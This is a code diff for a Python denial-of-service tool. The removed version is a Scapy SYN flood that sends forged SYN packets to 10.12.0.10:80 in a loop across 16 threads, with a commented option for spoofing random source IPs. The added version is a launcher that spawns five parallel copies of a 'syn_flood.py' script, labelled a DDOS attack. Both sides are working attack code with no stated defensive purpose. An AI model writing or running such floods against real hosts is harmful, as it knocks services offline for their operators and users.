@@ -1,36 +1,35 @@
-from scapy.all import *
-
-import concurrent.futures
-import sys
+import subprocess
 import time
+import os
 
-def syn_flood(target_ip, target_port):
-    # forge IP packet with target ip as the destination IP address
-    ip = IP(dst=target_ip)
-    # ip = IP(src=RandIP("10.2.0.1/24"), dst=target_ip) # with random IPs (spoofing)
+# Function to run a command with Popen and store the process in a list
+def run_ddos_syn_flood(command, process_list):
+    for i in range(5):
+        print("[+] Starting DDOS Syn Flood Attack id: {}".format(i))
+        process = subprocess.Popen(command)
+        process_list.append(process)
 
-    tcp = TCP(sport=RandShort(), dport=target_port, flags="S") # the flag "S" indicates the type SYN
 
-    raw = Raw(b"A"*1024) # adding some data
+# List to store the Popen processes
+process_list = []
 
-    # forge the packet
-    packet = ip / tcp / raw
+command = ['python3', 'syn_flood.py']
+run_ddos_syn_flood(command, process_list)
 
-    send(packet, loop=1, verbose=0) # resend the packet several time
+print("Press CTRL+C to kill the running processes ...")
 
-target_ip = "10.12.0.10"
-target_port = 80 # target port that will be flooded
+try:
+    while(True):
+        time.sleep(1)
+except KeyboardInterrupt as e:
+    # Terminate all the processes in the list
+    for process in process_list:
+        process.terminate()
+        os.kill(process.pid, 9)  # Ensure the process is killed (optional)
 
-start_time = time.time()
+    # Wait for all processes to terminate
+    for process in process_list:
+        process.wait()
 
-with concurrent.futures.ThreadPoolExecutor(max_workers=16) as executor:
-    futures = []
-    for i in range(16):
-        futures.append(executor.submit(
-            syn_flood, target_ip, target_port))
+    print("All processes terminated")
 
-    for future in concurrent.futures.as_completed(futures):
-        if future.result():
-            executor.shutdown(wait=False)
-            print('Time taken :', time.time() - start_time)
-            sys.exit(0)
